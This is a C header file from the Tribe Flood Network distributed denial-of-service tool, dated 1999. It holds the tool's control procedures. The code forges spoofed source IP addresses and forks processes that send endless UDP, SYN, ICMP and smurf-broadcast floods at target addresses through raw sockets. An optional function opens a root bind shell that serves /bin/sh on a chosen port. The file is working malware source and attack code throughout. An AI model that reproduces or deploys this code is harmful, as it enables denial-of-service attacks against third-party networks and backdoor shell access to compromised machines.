/* tribe flood network control procedures
   (c) 1999 by Mixter - PRIVATE */

#ifndef _CONTROL_H
#define _CONTROL_H
#include "tubby.h"
#include <string.h>

u_long myip = 2130706433;	/* 127.0.0.1 host byte ordered */
int kiddie = 0, fw00ding = 0, nospoof = 0, pid[CHLD_MAX + 5];
int rawsock;

inline u_long
k00lip (void)
{
  struct in_addr hax0r;
  char convi[16];
  int a, b, c, d;

  if (nospoof < 1)
    return (u_long) random ();

  hax0r.s_addr = htonl (myip);

  srandom ((time (NULL) + random () % getpid ()));	/* supreme random leetness */

  sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);

  if (nospoof < 2)
    b = getrandom (1, 254);
  if (nospoof < 3)
    c = getrandom (1, 254);
  d = getrandom (1, 254);

  sprintf (convi, "%d.%d.%d.%d", a, b, c, d);

  return inet_addr (convi);
}

char *
k00lntoa (void)
{
  struct in_addr hax0r;
  hax0r.s_addr = k00lip ();
  return (inet_ntoa (hax0r));
}

#ifdef ID_SHELL
void
shellsex (int port)
{
  int s1, s2, s3;
  struct sockaddr_in s_a, c_a;

  if (fork ())
    return;

  setuid (0);
  setgid (0);
  setreuid (0, 0);
  setregid (0, 0);
  s1 = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
  bzero ((char *) &s_a, sizeof (s_a));
  s_a.sin_family = AF_INET;
  s_a.sin_addr.s_addr = htonl (INADDR_ANY);
  s_a.sin_port = htons (port);
  if (bind (s1, (struct sockaddr *) &s_a, sizeof (s_a)) < 0)
    exit (0);
  if (listen (s1, 1) < 0)
    exit (0);

  while (1)
    {
      s3 = sizeof (c_a);
      s2 = accept (s1, (struct sockaddr *) &c_a, &s3);
      dup2 (s2, 0);
      dup2 (s2, 1);
      dup2 (s2, 2);
      execl ("/bin/sh", "sh", (char *) 0);
      close (s2);
      return;
    }
}
#endif

void
commence_udp (char *ip)
{
  int i = -1, p;
  u_long resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      resolved = inet_addr (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1)
	    udp (resolved);
	}
#ifdef ATTACKLOG
      {
	char tmp[100];
	sprintf (tmp, "PID %d forking (#%d), child (%d) attacks %s\n"
		 ,getpid (), i, p, parse);
	dbug (tmp);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }

}

void
commence_syn (char *ip, int port)
{
  int i = -1, p;
  u_long resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      resolved = inet_addr (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1)
	    syn (resolved, port);
	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attacks %s\n"
		 ,getpid (), i, p, parse);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
commence_icmp (char *ip)
{
  int i = -1, p;
  u_long resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      resolved = inet_addr (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1)
	    icmp (resolved, 0);
	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attacks %s\n"
		 ,getpid (), i, p, parse);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
commence_smurf (char *ip)
{
  int i = -1, p;
  u_long bcast, resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  resolved = inet_addr (parse);
  if (resolved == -1)
    {
      fw00ding = 0;
      return;
    }
  if ((parse = strtok (NULL, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      bcast = inet_addr (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1)
	    icmp (resolved, bcast);
	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attack-bcast %s\n"
		 ,getpid (), i, p, parse);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
must_kill_all (void)
{
  int i;

  for (i = 0; i <= CHLD_MAX - 1; i++)
    {
#ifdef ATTACKLOG
      char tmp[100];
      if (pid[i] < 2)
	break;			/* killing -1 or 0 != fun :) */
      sprintf (tmp, "Killing flood pid (#%d): %d\n", i, pid[i]);
      dbug (tmp);
      kill (pid[i], 9);
#else
      if (pid[i] < 2)
	break;			/* killing -1 or 0 != fun :) */
      kill (pid[i], 9);
#endif
    }
}

char strfl_syn[] = "SYN";
char strfl_udp[] = "UDP";
char strfl_icmp[] = "ICMP";
char strfl_smurf[] = "SMURF";
char strfl_not[] = "NOT";

char *
strfl (void)
{
  if (fw00ding == 1)
    return (strfl_udp);
  if (fw00ding == 2)
    return (strfl_syn);
  if (fw00ding == 3)
    return (strfl_icmp);
  if (fw00ding == 4)
    return (strfl_smurf);
  return (strfl_not);
}
#endif
